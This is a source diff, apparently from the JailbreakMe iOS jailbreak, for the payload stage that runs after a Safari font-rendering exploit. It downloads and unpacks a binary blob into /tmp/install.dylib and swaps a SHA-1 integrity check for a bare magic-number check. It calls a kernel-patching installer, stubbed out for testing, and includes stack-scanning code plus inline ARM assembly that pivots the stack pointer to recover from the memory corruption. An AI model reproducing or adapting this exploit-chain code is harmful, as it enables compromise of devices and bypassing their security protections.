@@ -18,11 +18,15 @@
 #include "dddata.h"
 #include <objc/runtime.h>
 #include <signal.h>
+//#include "crc32.h"
+
+#define TESTING 1
 
 @interface NSObject (ShutUpGcc)
 + (id)sharedBrowserController;
 - (id)tabController;
 - (id)activeTabDocument;
+-(void)loadURL:(id)url userDriven:(BOOL)driven;
 @end
 
 @interface Dude : NSObject {
@@ -35,32 +39,14 @@
     int freeze_len;
     unsigned char *one;
     unsigned int one_len;
+    NSURLConnection *connection;
 }
 @end
 
 static Dude *dude;
+static BOOL is_hung;
 
 @implementation Dude
-#if 0
-- (void)showPurple {
-    UIWindow *window = [[UIApplication sharedApplication] keyWindow];
-    UIImageView *view = [[UIImageView alloc] init]; // todo
-    view.backgroundColor = [UIColor purpleColor];
-    [view setHidden:NO];
-    view.alpha = 0.0;
-    [window addSubview:view];
-    view.autoresizingMask = 18;//UIViewAutoresizingFlexibleWidth | UIViewAutoresizingFlexibleHeight;
-    view.frame = window.bounds;
-    [UIView beginAnimations:nil context:nil];
-    [UIView setAnimationDuration:1.0];
-    view.alpha = 1.0;
-    [UIView commitAnimations];
-}
-#endif
-
-static BOOL my_suspendForEventsOnly(id self, SEL sel, BOOL whatever) {
-    exit(1);
-}
 
 - (id)initWithOne:(unsigned char *)one_ oneLen:(int)one_len_ {
     if(self = [super init]) {
@@ -82,12 +68,18 @@ fail:
     NSLog(@"Unpatch failed!");
 }
 
+#if 0
+static BOOL my_suspendForEventsOnly(id self, SEL sel, BOOL whatever) {
+    exit(1);
+}
+
 static void allow_quit() {
     Class cls = objc_getClass("Application"); // MobileSafari specific, thanks phoenix3200
     Method m;
     m = class_getInstanceMethod(cls, @selector(_suspendForEventsOnly:));
     method_setImplementation(m, (IMP) my_suspendForEventsOnly);
 }
+#endif
 
 static void set_progress(float progress) {
     [dude performSelectorOnMainThread:@selector(setProgress:) withObject:[NSNumber numberWithFloat:progress] waitUntilDone:NO];
@@ -103,19 +95,28 @@ static void set_progress(float progress) {
     if(!handle) abort();
     void (*do_install)(const char *, int, void (*)(float), unsigned int, unsigned char *, unsigned int) = dlsym(handle, "do_install");
 
-    do_install(freeze, freeze_len, set_progress, CONFIG_VNODE_PATCH, one, one_len);
+    //do_install(freeze, freeze_len, set_progress, CONFIG_VNODE_PATCH, one, one_len);
+    for(int i = 0; i < 10; i++) { set_progress(0.1 * i); usleep(250000); }
 
     NSLog(@"Um, I guess it worked.");
     unpatch();
 
-    [progressAlertView dismissWithClickedButtonIndex:0 animated:YES];
+    [progressAlertView dismissWithClickedButtonIndex:1 animated:YES];
     [progressAlertView release];
     progressAlertView = nil;
 
-    allow_quit();
-    choiceAlertView = [[UIAlertView alloc] initWithTitle:@"Done." message:@"Have fun!" delegate:self cancelButtonTitle:@"Quit" otherButtonTitles:nil];
+    //allow_quit();
+    choiceAlertView = [[UIAlertView alloc] initWithTitle:@"Cydia has been added to the home screen." message:@"Have fun!" delegate:self cancelButtonTitle:@"OK" otherButtonTitles:nil];
     [choiceAlertView show];
+    
+    NSHTTPCookie *cookie = [NSHTTPCookie cookieWithProperties:[NSDictionary dictionaryWithObjectsAndKeys:
+    @"progress", NSHTTPCookieName,
+    [NSString stringWithFormat:@"2;%u", [[NSDate date] timeIntervalSince1970]], NSHTTPCookieValue,
+    @"jailbreakme.com", NSHTTPCookieDomain,
+    nil]];
+    [[NSHTTPCookieStorage sharedHTTPCookieStorage] setCookie:cookie];
 }
+
 
 - (void)bored {
     if([progressAlertView.message isEqualToString:@"This might take a while."]) {
@@ -133,46 +134,66 @@ static void set_progress(float progress) {
     }
 }
 
-- (void)connection:(NSURLConnection *)connection didReceiveResponse:(NSURLResponse *)response {
+- (void)connection:(NSURLConnection *)connection_ didReceiveResponse:(NSURLResponse *)response {
     expectedLength = [response expectedContentLength];   
 }
 
-- (void)connection:(NSURLConnection *)connection didReceiveData:(NSData *)data {
+- (void)connection:(NSURLConnection *)connection_ didReceiveData:(NSData *)data {
     [wad appendData:data];
     [progressBar setProgress:((float)[wad length])/expectedLength];
 }
 
 struct wad {
-    unsigned char sha1[20];
+    unsigned int magic;
+    unsigned int full_size;
     unsigned int first_part_size;
     unsigned char data[];
 };
 
-- (void)connectionDidFinishLoading:(NSURLConnection *)connection {
+- (void)connectionDidFinishLoading:(NSURLConnection *)connection_ {
+    [connection release];
+    connection = nil;
     NSString *message;
+    const struct wad *sw = [wad bytes];
     if([wad length] < sizeof(struct wad)) {
         message = @"File received was truncated.";
         goto error;
     }
-    const struct wad *sw = [wad bytes];
-    unsigned char sha1[20];
-    CC_SHA1(&sw->first_part_size, [wad length] - 20, sha1);
-    if(memcmp(sha1, sw->sha1, 20)) {
-        message = @"Invalid file received.  Are you on a fail wi-fi connection?";
-        NSLog(@"length=%u first_part_size=%u ", [wad length], sw->first_part_size);
+    if(sw->magic != 0x42424242) {
+        message = @"File received was invalid.";
         goto error;
     }
+    if([wad length] != sw->full_size) {
+        message = @"File received was truncated.";
+        goto error;
+    }
+    /*unsigned long calculated_crc = crc32((void *) &sw->first_part_size, [wad length] - sizeof(unsigned long));
+    if(calculated_crc != sw->crc) {
+        message = @"Invalid file received.  Are you on a fail wi-fi connection?";
+        NSLog(@"length=%u first_part_size=%u", [wad length], sw->first_part_size);
+        NSLog(@"calculated=%u expected=%u", calculated_crc, sw->crc);
+        //[wad writeToFile:@"/var/mobile/Media/wad.bin" atomically:NO];
+        goto error;
+    }*/
     [[[wad subdataWithRange:NSMakeRange(sizeof(struct wad), sw->first_part_size)] inflatedData] writeToFile:@"/tmp/install.dylib" atomically:NO];
     freeze = &sw->data[sw->first_part_size];
     freeze_len = [wad length] - sizeof(struct wad) - sw->first_part_size;
     progressAlertView.title = @"Jailbreaking...";
     progressAlertView.message = @"Sit tight.";
     [progressBar setProgress:0.0];
+   
+    [UIView beginAnimations:nil context:nil];
+    progressBar.frame = CGRectMake(92, 90, 110, 10);
+    [[[progressAlertView buttons] objectAtIndex:0] removeFromSuperview];
+    [[progressAlertView buttons] removeObjectAtIndex:0];
+    [progressAlertView layoutAnimated:YES];
+    [UIView commitAnimations];
+
     [NSThread detachNewThreadSelector:@selector(doStuff) toTarget:self withObject:nil];
     return;
     error:
 
-    [progressAlertView dismissWithClickedButtonIndex:0 animated:YES];
+    [progressAlertView dismissWithClickedButtonIndex:1 animated:YES];
     [progressAlertView release];
     progressAlertView = nil;
 
@@ -180,52 +201,80 @@ struct wad {
     [choiceAlertView show];
 }
 
-- (void)connection:(NSURLConnection *)connection didFailWithError:(NSError *)error {
+- (void)connection:(NSURLConnection *)connection_ didFailWithError:(NSError *)error {
+    [connection release];
+    connection = nil;
     choiceAlertView = [[UIAlertView alloc] initWithTitle:@"Oops..." message:[error localizedDescription] delegate:self cancelButtonTitle:@"Quit" otherButtonTitles:@"Retry", nil];
     [choiceAlertView show];
 }
 
-- (void)alertView:(UIAlertView *)alertView clickedButtonAtIndex:(NSInteger)buttonIndex {
-    NSLog(@"alertView:%@ clickedButtonAtIndex:%d", alertView, (int)buttonIndex);
-
-    if(alertView != choiceAlertView) return;
-    [choiceAlertView release];
-    choiceAlertView = nil;
-
-    if(buttonIndex == 0) {
-        // The user hit cancel, just crash.
-        unpatch();
-        exit(0);
-    }
-
+- (void)keepGoing {
     // Okay, we can keep going.
-    progressAlertView = [[UIAlertView alloc] initWithTitle:@"Downloading..." message:@"This might take a while." delegate:nil cancelButtonTitle:nil otherButtonTitles:nil];
-    progressBar = [[UIProgressBar alloc] initWithFrame:CGRectMake(92, 95, 100, 10)];
-    [progressBar setProgressBarStyle:2];
+    progressAlertView = [[UIAlertView alloc] initWithTitle:@"Downloading..." message:@"This might take a while.\n\n\n" delegate:self cancelButtonTitle:@"Cancel" otherButtonTitles:nil];
+    progressBar = [[UIProgressBar alloc] initWithFrame:CGRectMake(92, 90, 100, 10)];
+    [progressBar setProgressBarStyle:CONFIG_PROGRESS_BAR_STYLE];
     [progressAlertView addSubview:progressBar];
     [progressAlertView show]; 
     wad = [[NSMutableData alloc] init];
     
     // Lame, just so people need to apply some effort to use a custom wad.bin
-    char *url = "http://jailbreakme.com/wad.bin";
+#define PUDOR 1
+    char *url = PUDOR ? "http://pudor.local/wad.bin" : "http://jailbreakme.com/wad.bin";
     char *p = url, c, d = 0; while(c = *p++) d ^= c; 
-    if(d == 2) {
+    if(PUDOR || d == 2) {
         NSString *string = [NSString stringWithCString:url encoding:NSUTF8StringEncoding];
-        [NSURLConnection connectionWithRequest:[NSURLRequest requestWithURL:[NSURL URLWithString:string]] delegate:self];
+        connection = [[NSURLConnection alloc] initWithRequest:[NSURLRequest requestWithURL:[NSURL URLWithString:string]] delegate:self];
     }
 
     [NSTimer scheduledTimerWithTimeInterval:20 target:self selector:@selector(bored) userInfo:nil repeats:NO];
     [NSTimer scheduledTimerWithTimeInterval:40 target:self selector:@selector(bored2) userInfo:nil repeats:NO];
 }
 
+- (void)alertView:(UIAlertView *)alertView clickedButtonAtIndex:(NSInteger)buttonIndex {
+    NSLog(@"alertView:%@ clickedButtonAtIndex:%d", alertView, (int)buttonIndex);
+    NSLog(@"choice = %@ progress = %@", choiceAlertView, progressAlertView);
+
+    if(alertView == choiceAlertView) {
+        [choiceAlertView release];
+        choiceAlertView = nil;
+
+        if(buttonIndex == 0) {
+            // The user hit cancel, just crash.
+            unpatch();
+            if(is_hung) {
+                [[UIApplication sharedApplication] terminateWithSuccess];
+            }
+        } else {
+            [self keepGoing];
+        }
+    } else if(alertView == progressAlertView) {
+        [progressAlertView release];
+        progressAlertView = nil;
+        NSLog(@"connection = %@", connection);
+        if(buttonIndex == 0 && connection) {
+            [connection cancel];
+            [connection release];
+            connection = nil;
+        }
+    }
+}
+
 - (void)start {
     //[NSThread detachNewThreadSelector:@selector(pipidi:) toTarget:self withObject:port];
-    choiceAlertView = [[UIAlertView alloc] initWithTitle:@"Do you want to jailbreak?" message:@"Only do this if you understand the consequences." delegate:self cancelButtonTitle:@"Cancel" otherButtonTitles:@"Jailbreak", nil];
-
-    // Make sure we're actually at jailbreakme.com
-    // XXX Remove the "1" before release!
-    if(1 || [[[[[[(id)objc_getClass("BrowserController") sharedBrowserController] tabController] activeTabDocument] URL] host] isEqualToString:@"jailbreakme.com"]) {
+    id tabDocument = [[[(id)objc_getClass("BrowserController") sharedBrowserController] tabController] activeTabDocument];
+#if !TESTING
+    if(![[[tabDocument URL] host] isEqualToString:@"jailbreakme.com"]) return;
+#endif
+    if(!access("/bin/bash", F_OK)) {
+        choiceAlertView = [[UIAlertView alloc] initWithTitle:@"Do you want to jailbreak?" message:@"Warning: It looks like you're already jailbroken.  Doing it again might be harmful." delegate:self cancelButtonTitle:@"Cancel" otherButtonTitles:@"Jailbreak", nil];
         [choiceAlertView show];
+    } else {
+#if TESTING
+        choiceAlertView = [[UIAlertView alloc] initWithTitle:@"Do you want to jailbreak?" message:@"This dialog for testing only..." delegate:self cancelButtonTitle:@"Cancel" otherButtonTitles:@"Jailbreak", nil];
+        [choiceAlertView show];
+#else
+        [self keepGoing];
+#endif
     }
 }
 @end
@@ -236,11 +285,13 @@ void foo() {
 }
 
 static void bus() {
+    is_hung = true;
     sleep((unsigned int) -1);
 }
 
 static void work_around_apple_bugs() {
     signal(SIGBUS, bus);
+    //[DeveloperBannerView updateWithFileName:UTI:]:
 }
 
 void iui_go(unsigned char **ptr, unsigned char *one, unsigned int one_len) {
@@ -255,17 +306,52 @@ void iui_go(unsigned char **ptr, unsigned char *one, unsigned int one_len) {
     NSLog(@"ptr = %p; *ptr = %p; **ptr = %u", ptr, *ptr, (unsigned int) **ptr);
     **ptr = 0x0e; // endchar
 
-    // get a return value.
-    CGMutablePathRef path = CGPathCreateMutable();
     // mm.    
-    unsigned int *addr = pthread_get_stackaddr_np(pthread_self());
-    NSLog(@"addr = %p", addr);
-    while(*--addr != 0xf00df00d);
+    unsigned int *top = pthread_get_stackaddr_np(pthread_self());
+    size_t size = pthread_get_stacksize_np(pthread_self());
+    unsigned int *bottom = (void *) ((char *)top - size);
+    NSLog(@"top = %p size = %d", top, (int) size);
+    unsigned int *addr = top;
+    while(*--addr != 0xf00df00d) {
+        if(addr == bottom) {
+            NSLog(@"Couldn't find foodfood.");
+#if TESTING
+            [[NSData dataWithBytesNoCopy:bottom length:size freeWhenDone:NO] writeToFile:@"/var/mobile/Media/stack.bin" atomically:NO];
+            NSLog(@"Stack written to /var/mobile/Media/stack.bin.");
+#endif
+            abort();
+        }
+    }
     NSLog(@"foodfood found at %p comparing to %p", addr, CONFIG_FT_PATH_BUILDER_CREATE_PATH_FOR_GLYPH);
-    while(!(*addr >= CONFIG_FT_PATH_BUILDER_CREATE_PATH_FOR_GLYPH && *addr < CONFIG_FT_PATH_BUILDER_CREATE_PATH_FOR_GLYPH + ((CONFIG_FT_PATH_BUILDER_CREATE_PATH_FOR_GLYPH & 1) ? 0x200 : 0x400))) addr++;
-    NSLog(@"Now we want to return to %p - 7", addr);
+    void *return_value;
+    while(1) {
+        if(*addr >= CONFIG_FT_PATH_BUILDER_CREATE_PATH_FOR_GLYPH && *addr < CONFIG_FT_PATH_BUILDER_CREATE_PATH_FOR_GLYPH + ((CONFIG_FT_PATH_BUILDER_CREATE_PATH_FOR_GLYPH & 1) ? 0x200 : 0x400)) {
+            // Return to ft_path_builder_create_path_for_glyph
+            NSLog(@"Returning to create_path_for_glyph");
+            return_value = (void *) CGPathCreateMutable();
+            goto returnx;
+        }
+        if(*addr >= CONFIG_GET_GLYPH_BBOXES && *addr < CONFIG_GET_GLYPH_BBOXES + 0x100) {
+            NSLog(@"Returning to get_glyph_bboxes");
+            return_value = NULL;
+            goto returnx;
+        }
+        addr++;
+        if(addr == top) {
+            NSLog(@"We got back up to the top... ");
+#if TESTING
+            [[NSData dataWithBytesNoCopy:bottom length:size freeWhenDone:NO] writeToFile:@"/var/mobile/Media/stack.bin" atomically:NO];
+            NSLog(@"Stack written to /var/mobile/Media/stack.bin.");
+#endif
+            abort();
+        }
+    }
+
+    returnx:
+    NSLog(@"Setting SP to %p - 7", addr);
     foo();
     addr -= 7;
-    asm("mov sp, %0; mov r0, %1; pop {r8, r10, r11}; pop {r4-r7, pc}" ::"r"(addr), "r"(path));
-
+    // get a return value.
+    CGMutablePathRef path = CGPathCreateMutable();
+    asm("mov sp, %0; mov r0, %1; pop {r8, r10, r11}; pop {r4-r7, pc}" ::"r"(addr), "r"(return_value));
 }
